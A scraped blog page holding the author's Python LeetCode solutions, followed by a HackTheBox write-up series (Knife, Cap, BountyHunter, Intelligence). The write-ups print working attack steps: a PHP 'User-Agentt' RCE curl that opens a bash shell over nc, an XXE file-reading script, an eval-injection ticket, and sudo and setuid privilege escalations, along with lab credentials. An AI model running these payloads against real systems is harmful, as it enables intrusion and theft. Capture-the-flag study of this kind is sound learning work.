-42&quot;（读入前导空格，但忽视掉） ^第 2 步：&quot; -42&quot;（读入 &#39;-&#39; 字符，所以结果应该是负数） ^第 3 步：&quot; -42&quot;（读入 &quot;42&quot;） ^解析得到整数 -42 。 由于 “-42” 在范围[−231,231−1][-2^{31}, 2^{31} - 1][−231,231−1]内，最终结果为 -42 。 示例3： 12345678910输入：s &#x3D; &quot;4193 with words&quot;输出：4193解释：第 1 步：&quot;4193 with words&quot;（当前没有读入字符，因为没有前导空格） ^第 2 步：&quot;4193 with words&quot;（当前没有读入字符，因为这里不存在 &#39;-&#39; 或者 &#39;+&#39;） ^第 3 步：&quot;4193 with words&quot;（读入 &quot;4193&quot;；由于下一个字符不是一个数字，所以读入停止） ^解析得到整数 4193 。 由于 “4193” 在范围[−231,231−1][-2^{31}, 2^{31} - 1][−231,231−1]内，最终结果为 4193 。 示例4： 12345678910输入：s &#x3D; &quot;words and 987&quot;输出：0解释：第 1 步：&quot;words and 987&quot;（当前没有读入字符，因为没有前导空格） ^第 2 步：&quot;words and 987&quot;（当前没有读入字符，因为这里不存在 &#39;-&#39; 或者 &#39;+&#39;） ^第 3 步：&quot;words and 987&quot;（由于当前字符 &#39;w&#39; 不是一个数字，所以读入停止） ^解析得到整数 0 ，因为没有读入任何数字。 由于 0 在范围[−231,231−1][-2^{31}, 2^{31} - 1][−231,231−1]内，最终结果为 0 。 示例5： 12345678910输入：s &#x3D; &quot;-91283472332&quot;输出：-2147483648解释：第 1 步：&quot;-91283472332&quot;（当前没有读入字符，因为没有前导空格） ^第 2 步：&quot;-91283472332&quot;（读入 &#39;-&#39; 字符，所以结果应该是负数） ^第 3 步：&quot;-91283472332&quot;（读入 &quot;91283472332&quot;） ^解析得到整数 -91283472332 。 由于 -91283472332 小于范围[−231,231−1][-2^{31}, 2^{31} - 1][−231,231−1]的下界，最终结果被截断为−231-2^{31}−231 = -2147483648 。 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/string-to-integer-atoi 著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 1234567891011121314151617181920212223242526272829303132class Solution:def myAtoi(self, s: str) -&gt; int: s = s.strip() length = len(s) flag = True if length == 0 or s[0] not in &quot;+-0123456789&quot;: return(0) if s[0] == &quot;+&quot;: s = s[1:] elif s[0] == &quot;-&quot;: flag = False s = s[1:] num_list = [] for _ in s: if _ in &quot;0123456789&quot;: num_list.append(_) else: break num_sum = 0 index = 0 for _ in range(-1, -len(num_list)-1, -1): num_sum += int(num_list[_]) * pow(10, index) index += 1 if flag == True: if num_sum &lt;= pow(2, 31) - 1: return(num_sum) else: return(pow(2, 31) - 1) elif num_sum &lt;= pow(2, 31): return(-num_sum) else: return(-pow(2, 31)) 和整数反转那题思路差不多 无非多做几个检测罢了 回文数 给你一个整数x，如果x是一个回文整数，返回true；否则，返回false。 回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。例如，121是回文，而123不是。 示例 1： 12输入：x &#x3D; 121输出：true 示例2： 123输入：x &#x3D; -121输出：false解释：从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。 示例 3： 123输入：x &#x3D; 10输出：false解释：从右向左读, 为 01 。因此它不是一个回文数。 示例 4： 12输入：x &#x3D; -101输出：false 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/palindrome-number 著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 123456789class Solution: def isPalindrome(self, x: int) -&gt; bool: if x &lt; 0: return(False) string = str(x) if string == string[::-1]: return(True) else: return(False) 当字符串来处理挺方便的 就是有点占内存 正则表达式匹配 给你一个字符串s和一个字符规律p，请你来实现一个支持'.'和'\\*'的正则表达式匹配。 ‘.’ 匹配任意单个字符 ‘*’ 匹配零个或多个前面的那一个元素 所谓匹配，是要涵盖整个字符串s的，而不是部分字符串。 示例 1： 123输入：s &#x3D; &quot;aa&quot; p &#x3D; &quot;a&quot;输出：false解释：&quot;a&quot; 无法匹配 &quot;aa&quot; 整个字符串。 示例 2: 123输入：s &#x3D; &quot;aa&quot; p &#x3D; &quot;a*&quot;输出：true解释：因为 &#39;*&#39; 代表可以匹配零个或多个前面的那一个元素, 在这里前面的元素就是 &#39;a&#39;。因此，字符串 &quot;aa&quot; 可被视为 &#39;a&#39; 重复了一次。 示例3： 123输入：s &#x3D; &quot;ab&quot; p &#x3D; &quot;.*&quot;输出：true解释：&quot;.*&quot; 表示可匹配零个或多个（&#39;*&#39;）任意字符（&#39;.&#39;）。 示例 4： 123输入：s &#x3D; &quot;aab&quot; p &#x3D; &quot;c*a*b&quot;输出：true解释：因为 &#39;*&#39; 表示零个或多个，这里 &#39;c&#39; 为 0 个, &#39;a&#39; 被重复一次。因此可以匹配字符串 &quot;aab&quot;。 示例 5： 12输入：s &#x3D; &quot;mississippi&quot; p &#x3D; &quot;mis*is*p*.&quot;输出：false 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/regular-expression-matching 著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 123456789class Solution: def isMatch(self, s: str, p: str) -&gt; bool: import re length = len(s) result = re.match(p, s) if result != None and result.span()[1] == length: return(True) else: return(False) 属实不会去写正则的匹配规则 直接re.match梭哈了 盛最多水的容器 给你n个非负整数a1,a2,...,anaa_1, a_2, ..., a_naa1​,a2​,...,an​a ，每个数代表坐标中的一个点(i,ai)。在坐标内画n条垂直线，垂直线i的两个端点分别为(i,ai)和(i, 0)。找出其中的两条线，使得它们与x轴共同构成的容器可以容纳最多的水。 说明：你不能倾斜容器。 示例 1： 123输入：[1,8,6,2,5,4,8,3,7]输出：49 解释：图中垂直线代表输入数组 [1,8,6,2,5,4,8,3,7]。在此情况下，容器能够容纳水（表示为蓝色部分）的最大值为49。 示例 2： 12输入：height &#x3D; [1,1]输出：1 示例 3： 12输入：height &#x3D; [4,3,2,1,4]输出：16 示例 4： 12输入：height &#x3D; [1,2,1]输出：2 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/container-with-most-water 著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 123456789101112131415161718class Solution: def maxArea(self, height) -&gt; int: length = len(height) area = 0 h = 0 index1 = 0 index2 = length - 1 for _ in range(length): if height[index1] &gt;= height[index2]: h = height[index2] index2 -= 1 else: h = height[index1] index1 += 1 temp = h * (index2 + 1 - index1) if temp &gt; area: area = temp return(area) 自己逻辑都还没理清楚，代码就能跑了 一开始想二维查找梭哈，然后死在一个长度5000的列表上了 旧症复发了属于是 然后开始用一维的角度去思考 AB分别为初始值在列表两端的下标，两边往中间回缩（中间往两边跑也行） A大就挪B，反之亦然 整数转罗马数字 罗马数字包含以下七种字符:I，V，X，L，C，D和M。 12345678字符 数值I 1V 5X 10L 50C 100D 500M 1000 例如，罗马数字2写做II，即为两个并列的1。12写做XII，即为X+II。 27写做XXVII, 即为XX+V+II。 通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如4不写做IIII，而是IV。数字1在数字5的左边，所表示的数等于大数5减小数1得到的数值4 。同样地，数字9表示为IX。这个特殊的规则只适用于以下六种情况： I可以放在V(5) 和X(10) 的左边，来表示 4 和 9。 X可以放在L(50) 和C(100) 的左边，来表示 40 和90。 C可以放在D(500) 和M(1000) 的左边，来表示400 和900。 给你一个整数，将其转为罗马数字。 示例1: 12输入:num &#x3D; 3输出: &quot;III&quot; 示例2: 12输入:num &#x3D; 4输出: &quot;IV&quot; 示例3: 12输入:num &#x3D; 9输出: &quot;IX&quot; 示例4: 123输入:num &#x3D; 58输出: &quot;LVIII&quot;解释: L &#x3D; 50, V &#x3D; 5, III &#x3D; 3. 示例5: 123输入:num &#x3D; 1994输出: &quot;MCMXCIV&quot;解释: M &#x3D; 1000, CM &#x3D; 900, XC &#x3D; 90, IV &#x3D; 4. 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/integer-to-roman 著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253class Solution: def intToRoman(self, num: int) -&gt; str: num_list = [] while num != 0: num_list.append(num % 10) num //= 10 result = &quot;&quot; for _ in range(len(num_list)): if _ == 0: if num_list[_] == 0: continue elif num_list[_] &lt;= 3: result = &quot;I&quot; * num_list[_] + result else: diff = num_list[_] - 5 mod = num_list[_] % 5 if diff == -1: result = &quot;IV&quot; + result elif mod &lt; 4: result = &quot;V&quot; + &quot;I&quot; * mod + result else: result = &quot;IX&quot; + result elif _ == 1: if num_list[_] == 0: continue elif num_list[_] &lt;= 3: result = &quot;X&quot; * num_list[_] + result else: diff = num_list[_] - 5 mod = num_list[_] % 5 if diff == -1: result = &quot;XL&quot; + result elif mod &lt; 4: result = &quot;L&quot; + &quot;X&quot; * mod + result else: result = &quot;XC&quot; + result elif _ == 2: if num_list[_] == 0: continue elif num_list[_] &lt;= 3: result = &quot;C&quot; * num_list[_] + result else: diff = num_list[_] - 5 mod = num_list[_] % 5 if diff == -1: result = &quot;CD&quot; + result elif mod &lt; 4: result = &quot;D&quot; + &quot;C&quot; * mod + result else: result = &quot;CM&quot; + result elif _ == 3: result = &quot;M&quot; * num_list[_] + result return(result) 一个挺中庸的解决方案 为了解决问题而解决问题 罗马数字转整数 罗马数字包含以下七种字符:I，V，X，L，C，D和M。 12345678字符 数值I 1V 5X 10L 50C 100D 500M 1000 例如，罗马数字2写做II，即为两个并列的1。12写做XII，即为X+II。 27写做XXVII, 即为XX+V+II。 通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如4不写做IIII，而是IV。数字1在数字5的左边，所表示的数等于大数5减小数1得到的数值4 。同样地，数字9表示为IX。这个特殊的规则只适用于以下六种情况： I可以放在V(5) 和X(10) 的左边，来表示 4 和 9。 X可以放在L(50) 和C(100) 的左边，来表示 40 和90。 C可以放在D(500) 和M(1000) 的左边，来表示400 和900。 给定一个罗马数字，将其转换成整数。输入确保在 1到 3999 的范围内。 示例1: 12输入:&quot;III&quot;输出: 3 示例2: 12输入:&quot;IV&quot;输出: 4 示例3: 12输入:&quot;IX&quot;输出: 9 示例4: 123输入:&quot;LVIII&quot;输出: 58解释: L &#x3D; 50, V&#x3D; 5, III &#x3D; 3. 示例5: 123输入:&quot;MCMXCIV&quot;输出: 1994解释: M &#x3D; 1000, CM &#x3D; 900, XC &#x3D; 90, IV &#x3D; 4. 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/roman-to-integer 著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135class Solution: def romanToInt(self, s: str) -&gt; int: length = len(s) number = 0 if s[0] == &quot;M&quot;: _ = 0 while s[_] == &quot;M&quot;: _ += 1 if _ == length: break s = s[_:] number += 1000 * _ length -= _ if length == 0: return(number) if s[0] == &quot;C&quot;: if length == 1: number += 100 length -= 1 elif s[1] == &quot;M&quot;: number += 900 length -= 2 s = s[2:] elif s[1] == &quot;D&quot;: number += 400 length -= 2 s = s[2:] else: _ = 0 while s[_] == &quot;C&quot;: _ += 1 if _ == length: break s = s[_:] number += 100 * _ length -= _ if length == 0: return(number) if s[0] == &quot;D&quot;: number += 500 length -= 1 s = s[1:] if length == 0: return(number) _ = 0 if s[_] == &quot;C&quot;: while s[_] == &quot;C&quot;: _ += 1 if _ == length: break s = s[_:] number += 100 * _ length -= _ if length == 0: return(number) if s[0] == &quot;X&quot;: if length == 1: number += 10 length -= 1 elif s[1] == &quot;C&quot;: number += 90 length -= 2 s = s[2:] elif s[1] == &quot;L&quot;: number += 40 length -= 2 s = s[2:] else: _ = 0 while s[_] == &quot;X&quot;: _ += 1 if _ == length: break s = s[_:] number += 10 * _ length -= _ if length == 0: return(number) if s[0] == &quot;L&quot;: number += 50 length -= 1 s = s[1:] if length == 0: return(number) _ = 0 if s[_] == &quot;X&quot;: while s[_] == &quot;X&quot;: _ += 1 if _ == length: break s = s[_:] number += 10 * _ length -= _ if length == 0: return(number) if s[0] == &quot;I&quot;: if length == 1: number += 1 length -= 1 elif s[1] == &quot;X&quot;: number += 9 length -= 2 s = s[2:] elif s[1] == &quot;V&quot;: number += 4 length -= 2 s = s[2:] else: _ = 0 while s[_] == &quot;I&quot;: _ += 1 if _ == length: break s = s[_:] number += 1 * _ length -= _ if length == 0: return(number) if s[0] == &quot;V&quot;: number += 5 length -= 1 s = s[1:] if length == 0: return(number) _ = 0 if s[_] == &quot;I&quot;: while s[_] == &quot;I&quot;: _ += 1 if _ == length: break s = s[_:] number += 1 * _ length -= _ if length == 0: return(number) 实在想不出啥好的算法了 只能摆烂了 最长公共前缀 编写一个函数来查找字符串数组中的最长公共前缀。 如果不存在公共前缀，返回空字符串&quot;&quot;。 示例 1： 12输入：strs &#x3D; [&quot;flower&quot;,&quot;flow&quot;,&quot;flight&quot;]输出：&quot;fl&quot; 示例 2： 123输入：strs &#x3D; [&quot;dog&quot;,&quot;racecar&quot;,&quot;car&quot;]输出：&quot;&quot;解释：输入不存在公共前缀。 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/longest-common-prefix 著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 1234567891011121314class Solution: def longestCommonPrefix(self, strs: List[str]) -&gt; str: length = 0 if len(strs) == 1: return(strs[0]) if &quot;&quot; in strs: return(&quot;&quot;) while True: for _ in range(1, len(strs)): if not strs[_].startswith(strs[0][:length]): return(strs[0][:length-1]) if length == len(strs[0]): return(strs[0]) length += 1 懒得写匹配 直接用startswith了 三数之和 给你一个包含n个整数的数组nums，判断nums中是否存在三个元素 a，b，c ，使得a + b + c = 0 ？请你找出所有和为0且不重复的三元组。 注意：答案中不可以包含重复的三元组。 示例 1： 12输入：nums &#x3D; [-1,0,1,2,-1,-4]输出：[[-1,-1,2],[-1,0,1]] 示例 2： 12输入：nums &#x3D; []输出：[] 示例 3： 12输入：nums &#x3D; [0]输出：[] 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/3sum 著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 1234567891011121314151617181920212223242526272829303132class Solution: def threeSum(self, nums: List[int]) -&gt; List[List[int]]: nums.sort() length = len(nums) if length &lt; 3: return([]) neg_count = 0 for _ in nums: if _ &lt; 0: neg_count += 1 elif _ == 0: neg_count += 1 break if neg_count == 0 or nums[-1] &lt; 0: return([]) result = [] for _ in range(0, neg_count): c = -nums[_] a = _ + 1 b = length - 1 while a &lt; b: if nums[a] + nums[b] == c: temp = [-c, nums[a], nums[b]] if temp not in result: result.append(temp) a += 1 b -= 1 elif nums[a] + nums[b] &gt; c: b -= 1 elif nums[a] + nums[b] &lt; c: a += 1 return(result) 实在想不出来咋做，看了下别人的题解 三个数之和为0在除了三个数都为0的情况下，至少有一个负数的存在 遍历所有的负数，两个下标分别指向c的下一位与结尾 通过a+b与-c的关系来移动a、b 最接近的三数之和 给定一个包括n个整数的数组nums和一个目标值target。找出nums中的三个整数，使得它们的和与target最接近。返回这三个数的和。假定每组输入只存在唯一答案。 示例： 123输入：nums &#x3D; [-1,2,1,-4], target &#x3D; 1输出：2解释：与 target 最接近的和是 2 (-1 + 2 + 1 &#x3D; 2) 。 来源：力扣（LeetCode） 链接：https://leetcode-cn.com/problems/3sum-closest 著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980class Solution: def threeSumClosest(self, nums: List[int], target: int) -&gt; int: length = len(nums) if length &lt; 3: return([]) nums.sort() if target &gt;= 0: if target &lt; nums[0]: return(nums[0] + nums[1] + nums[2]) neg_count = 0 for _ in nums: if _ &lt; target: neg_count += 1 elif _ == target: neg_count += 1 break sub = 9999 result = 0 for _ in range(0, neg_count): c = -nums[_] a = _ + 1 b = length - 1 while a &lt; b: if sub == 0: break if nums[a] + nums[b] == c + target: result = target sub = 0 break elif nums[a] + nums[b] &gt; c + target: temp = abs(nums[a] + nums[b] - c - target) if temp &lt; sub: sub = temp result = nums[a] + nums[b] - c b -= 1 elif nums[a] + nums[b] &lt; c + target: temp = abs(nums[a] + nums[b] - c - target) if temp &lt; sub: sub = temp result = nums[a] + nums[b] - c a += 1 return(result) elif target &lt; 0: nums = nums[::-1] print(nums) if target &gt; nums[0]: return(nums[0] + nums[1] + nums[2]) neg_count = 0 for _ in nums: if _ &gt; target: neg_count += 1 elif _ == target: neg_count += 1 break sub = 9999 result = 0 for _ in range(0, neg_count): c = -nums[_] a = _ + 1 b = length - 1 while a &lt; b: if sub == 0: break if nums[a] + nums[b] == c + target: result = target sub = 0 break elif nums[a] + nums[b] &gt; c + target: temp = abs(nums[a] + nums[b] - c - target) if temp &lt; sub: sub = temp result = nums[a] + nums[b] - c a += 1 elif nums[a] + nums[b] &lt; c + target: temp = abs(nums[a] + nums[b] - c - target) if temp &lt; sub: sub = temp result = nums[a] + nums[b] - c b -= 1 return(result) 跟上一题差不多的思路，加了点变化罢了 分了target正负两种情况来处理 但是写得太拉了 算法就图一乐，收收心干安服辣 EOF","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://yoloyolo.top/tags/LeetCode/"}]},{"title":"HachTheBox_Set_2","slug":"HackTheBox-Set-2","date":"2021-09-05T07:10:51.000Z","updated":"2023-02-14T15:31:13.000Z","comments":true,"path":"2021/09/05/HackTheBox-Set-2/","link":"","permalink":"https://yoloyolo.top/2021/09/05/HackTheBox-Set-2/","excerpt":"随缘更新","text":"随缘更新 HachTheBox_Knife 端口扫描 123456789nmap -sV -Pn -T5 10.10.10.242Nmap scan report for 10.10.10.242Host is up (0.36s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)80&#x2F;tcp open http Apache httpd 2.4.41 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel 漏洞利用 得到PHP版本信息 1234567curl -I http:&#x2F;&#x2F;10.10.10.242&#x2F;HTTP&#x2F;1.1 200 OKDate: Thu, 05 Aug 2021 05:54:34 GMTServer: Apache&#x2F;2.4.41 (Ubuntu)X-Powered-By: PHP&#x2F;8.1.0-devContent-Type: text&#x2F;html; charset&#x3D;UTF-8 查询得到相关漏洞 123456789searchsploit php 8.1 dev----------------------------------------------------------- --------------------------------- Exploit Title | Path----------------------------------------------------------- ---------------------------------PHP 8.1.0-dev - &#39;User-Agentt&#39; Remote Code Execution | php&#x2F;webapps&#x2F;49933.py----------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No Results 将Bash开放到目标服务器9876端口，并用nc连接 1curl -H &quot;User-Agentt: zerodiumsystem(&#39;mkfifo &#x2F;tmp&#x2F;bufferfly; cat &#x2F;tmp&#x2F;bufferfly | &#x2F;bin&#x2F;bash -i 2&gt;&amp;1 | nc -l 9876 &gt; &#x2F;tmp&#x2F;bufferfly&#39;);&quot; http:&#x2F;&#x2F;10.10.10.242&#x2F; 1234nc 10.10.10.242 9876cat &#x2F;home&#x2F;james&#x2F;user.txt71a8b414816d223319c095a64edbae6c 权限提升 查看sudo权限 1234567sudo -lMatching Defaults entries for james on knife: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser james may run the following commands on knife: (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;knife 1234sudo -u root knife exec --exec &quot;exec &#39;&#x2F;bin&#x2F;bash -i&#39;&quot;cat &#x2F;root&#x2F;root.txt6fa9527622b5b0396511a575bd529b42 HachTheBox_Cap 端口扫描 12345678910nmap -sV -Pn -T5 10.10.10.245Nmap scan report for 10.10.10.245Host is up (0.28s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION21&#x2F;tcp open ftp vsftpd 3.0.322&#x2F;tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)80&#x2F;tcp open http gunicornService Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel 漏洞利用 下载流量包 12curl -O http:&#x2F;&#x2F;10.10.10.245&#x2F;download&#x2F;0wireshark 0 得到FTP登入凭证 1nathan:Buck3tH4TF0RM3! 12ssh nathan@10.10.10.245Buck3tH4TF0RM3! 123cat &#x2F;home&#x2F;nathan&#x2F;user.txtf514ef062a27e672c5e88001061d8c5a 权限提升 查看capability 1234567getcap &#x2F;* -r 2&gt;&#x2F;dev&#x2F;null&#x2F;usr&#x2F;bin&#x2F;python3.8 &#x3D; cap_setuid,cap_net_bind_service+eip&#x2F;usr&#x2F;bin&#x2F;ping &#x3D; cap_net_raw+ep&#x2F;usr&#x2F;bin&#x2F;traceroute6.iputils &#x3D; cap_net_raw+ep&#x2F;usr&#x2F;bin&#x2F;mtr-packet &#x3D; cap_net_raw+ep&#x2F;usr&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;gstreamer1.0&#x2F;gstreamer-1.0&#x2F;gst-ptp-helper &#x3D; cap_net_bind_service,cap_net_admin+ep 使用python进行提权 1234&#x2F;usr&#x2F;bin&#x2F;python3.8 -c &#39;import os;os.setuid(0);os.system(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;cat &#x2F;root&#x2F;root.txt64941cc0edb38d723f72d34453780c90 HachTheBox_BountyHunter 端口扫描 123456789nmap -sV -Pn -T5 10.10.11.100Nmap scan report for 10.10.11.100Host is up (0.25s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22&#x2F;tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)80&#x2F;tcp open http Apache httpd 2.4.41 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel 路径扫描 123dirb http:&#x2F;&#x2F;10.10.11.100&#x2F; -X .php+ http:&#x2F;&#x2F;10.10.11.100&#x2F;db.php (CODE:200|SIZE:0) 漏洞利用 1234567891011121314151617181920import base64import reimport requestsreq &#x3D; requests.session()file &#x3D; input()payload &#x3D; &#123;&quot;data&quot;:base64.b64encode((&quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&quot;&quot;&quot; + file + &quot;&quot;&quot;\\&quot;&gt;]&gt; &lt;bugreport&gt; &lt;title&gt;&amp;xxe;&lt;&#x2F;title&gt; &lt;cwe&gt;2&lt;&#x2F;cwe&gt; &lt;cvss&gt;3&lt;&#x2F;cvss&gt; &lt;reward&gt;4&lt;&#x2F;reward&gt; &lt;&#x2F;bugreport&gt;&quot;&quot;&quot;).encode()).decode()&#125;url &#x3D; &quot;http:&#x2F;&#x2F;10.10.11.100&#x2F;tracker_diRbPr00f314.php&quot;res&#x3D;req.post(url&#x3D;url, data&#x3D;payload)data &#x3D; res.textdata &#x3D; data.replace(&quot;\\n&quot;, &quot;&quot;)result &#x3D; base64.b64decode(re.findall(&quot;&lt;td&gt;Title:&lt;&#x2F;td&gt; &lt;td&gt;(.*?)&lt;&#x2F;td&gt;&quot;, data)[0].encode()).decode()print(result) 读取/etc/passwd 1development:x:1000:1000:Development:&#x2F;home&#x2F;development:&#x2F;bin&#x2F;bash 读取db.php 123456&#x2F;&#x2F; TODO -&gt; Implement login system with the database.$dbserver &#x3D; &quot;localhost&quot;;$dbname &#x3D; &quot;bounty&quot;;$dbusername &#x3D; &quot;admin&quot;;$dbpassword &#x3D; &quot;m19RoAU0hP41A1sTsq6K&quot;;$testuser &#x3D; &quot;test&quot;; 登入SSH服务 12ssh development@10.10.11.100m19RoAU0hP41A1sTsq6K 123cat &#x2F;home&#x2F;development&#x2F;user.txt96248cc10e05f03e3b63eb59adfd9d4c 权限提升 1234567891011cat &#x2F;home&#x2F;development&#x2F;contract.txtHey team,I&#39;ll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.This has been our first job since the &quot;rm -rf&quot; incident and we can&#39;t mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.I set up the permissions for you to test this. Good luck.-- John 查看sudo权限 12345678sudo -lMatching Defaults entries for development on bountyhunter: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser development may run the following commands on bountyhunter: (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;python3.8 &#x2F;opt&#x2F;skytrain_inc&#x2F;ticketValidator.py 查看py文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253cat &#x2F;opt&#x2F;skytrain_inc&#x2F;ticketValidator.py#Skytrain Inc Ticket Validation System 0.1#Do not distribute this file.def load_file(loc): if loc.endswith(&quot;.md&quot;): return open(loc, &#39;r&#39;) else: print(&quot;Wrong file type.&quot;) exit()def evaluate(ticketFile): #Evaluates a ticket to check for ireggularities. code_line &#x3D; None for i,x in enumerate(ticketFile.readlines()): if i &#x3D;&#x3D; 0: if not x.startswith(&quot;# Skytrain Inc&quot;): return False continue if i &#x3D;&#x3D; 1: if not x.startswith(&quot;## Ticket to &quot;): return False print(f&quot;Destination: &#123;&#39; &#39;.join(x.strip().split(&#39; &#39;)[3:])&#125;&quot;) continue if x.startswith(&quot;__Ticket Code:__&quot;): code_line &#x3D; i+1 continue if code_line and i &#x3D;&#x3D; code_line: if not x.startswith(&quot;**&quot;): return False ticketCode &#x3D; x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0] if int(ticketCode) % 7 &#x3D;&#x3D; 4: validationNumber &#x3D; eval(x.replace(&quot;**&quot;, &quot;&quot;)) if validationNumber &gt; 100: return True else: return False return Falsedef main(): fileName &#x3D; input(&quot;Please enter the path to the ticket file.\\n&quot;) ticket &#x3D; load_file(fileName) #DEBUG print(ticket) result &#x3D; evaluate(ticket) if (result): print(&quot;Valid ticket.&quot;) else: print(&quot;Invalid ticket.&quot;) ticket.closemain() eval()可以进行执行命令 构造恶意文本 12345678cat &#x2F;tmp&#x2F;1.md# Skytrain Inc## Ticket to Bridgeport__Ticket Code:__**11+eval(&quot;__import__(&#39;os&#39;).system(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;)**##Issued: 2021&#x2F;06&#x2F;21#End Ticket 提权 12sudo -u root &#x2F;usr&#x2F;bin&#x2F;python3.8 &#x2F;opt&#x2F;skytrain_inc&#x2F;ticketValidator.py&#x2F;tmp&#x2F;1.md 123cat &#x2F;root&#x2F;root.txtd8b513ba7130a46641d2c65966f6b8e6 HachTheBox_Intelligence 端口扫描 12345678910111213141516171819nmap -sV -sT -Pn 10.10.10.248Nmap scan report for 10.10.10.248Host is up (0.21s latency).Not shown: 988 filtered portsPORT STATE SERVICE VERSION53&#x2F;tcp open domain Simple DNS Plus80&#x2F;tcp open http Microsoft IIS httpd 10.088&#x2F;tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-18 12:54:48Z)135&#x2F;tcp open msrpc Microsoft Windows RPC139&#x2F;tcp open netbios-ssn Microsoft Windows netbios-ssn389&#x2F;tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)445&#x2F;tcp open microsoft-ds?464&#x2F;tcp open kpasswd5?593&#x2F;tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636&#x2F;tcp open ssl&#x2F;ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)3268&#x2F;tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)3269&#x2F;tcp open ssl&#x2F;ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)Service Info: Host: DC; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows 漏洞利用 访问80端口，可以看到主页上有两个PDF的链接 尝试枚举其他PDF 12345678910111213141516#pdf.pyimport requestsreq = requests.session()for i in range(3): for j in range(1, 13): for k in range(31): year = str(2020 + i) month = (&quot;0&quot; + str(j)) if len(str(j)) == 1 else str(j) day = (&quot;0&quot; + str(k)) if len(str(k)) == 1 else str(k) url = &quot;http://10.10.10.248/documents/&quot; + year + &quot;-&quot; + month + &quot;-&quot; + day + &quot;-upload.pdf&quot; res = req.get(url) if res.status_code == 200: filename = year + &quot;-&quot; + month + &quot;-&quot; + day + &quot;-upload.pdf&quot; print(filename) file = open(filename, &quot;wb&quot;) file.write(res.content) 获取PDF的用户名 12345678#pdf.shfilelist=`ls *.pdf`filenum=`ls *.pdf|wc -l`for ((i=1;i&lt;=$filenum;i++))do filename[$&#123;i&#125;]=`ls *.pdf| sed -n $&#123;i&#125;p` echo `exiftool $&#123;filename[$&#123;i&#125;]&#125; | grep Creator | awk -F \\ &#x27;&#123;print \\$3&#125;&#x27;` &gt;&gt; userdone 从2020-06-04-upload.pdf中得到一个密码NewIntelligenceCorpUser9876 